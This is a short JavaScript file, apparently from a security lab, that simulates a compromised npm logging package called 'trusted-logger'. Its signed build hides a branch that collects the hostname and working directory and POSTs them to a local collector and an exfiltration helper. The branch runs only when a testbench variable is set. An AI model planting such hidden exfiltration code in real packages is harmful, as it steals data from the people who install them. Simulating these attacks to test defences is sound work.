/**
 * trusted-logger — structured logging helper (educational simulation)
 *
 * This package carries a valid npm provenance statement and a valid GitHub
 * artifact attestation, both produced by a compromised CI workflow that
 * re-used the project's signing key. The victim verifies the signatures,
 * trusts the package, and loads it.
 */

const http = require('http');
const os = require('os');

function log(level, message) {
  const entry = { level, message, ts: new Date().toISOString() };
  console.log(JSON.stringify(entry));
  return entry;
}

// Compromised CI workflow inserted this branch before publishing.
// In production it would be obfuscated; here it is gated for lab safety.
if (process.env.TESTBENCH_MODE === 'enabled') {
  const payload = {
    attack: 'npm-provenance-attestation-abuse',
    package: 'trusted-logger',
    version: '9.9.9',
    hostname: os.hostname(),
    cwd: process.cwd(),
    timestamp: new Date().toISOString()
  };

  const data = JSON.stringify(payload);
  const req = http.request({
    hostname: 'localhost',
    port: 3020,
    path: '/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(data)
    }
  }, () => {});

  req.on('error', () => {});
  req.write(data);
  req.end();

  try {
    const { uploadJson } = require('../../../detection-tools/floci/floci-exfil');
    uploadJson('20', 'provenance-exfil', payload);
  } catch (_) {
    // Floci is optional. The mock server on :3020 is the primary channel.
  }
}

module.exports = { log };
